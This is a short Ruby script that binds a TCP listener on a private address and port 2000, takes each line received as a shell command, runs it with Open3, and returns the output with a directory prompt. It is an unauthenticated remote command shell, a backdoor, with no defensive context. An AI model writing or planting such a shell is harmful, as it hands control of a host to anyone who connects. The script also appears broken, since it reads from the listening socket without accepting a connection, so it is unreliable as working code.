require 'socket'
require 'open3'

hostname = '10.34.137.141'
port = 2000

s = TCPServer.open(hostname, port)

while line = s.gets   # Read lines from the socket
  s.print("#{Dir.pwd}$")
  if line.chop == 'exit'
    s.close
    exit
  else
    stdin, stout, status = Open3.capture3(line.chop)      # And print with platform line terminator
    s.puts(stout)
  end
end
s.close
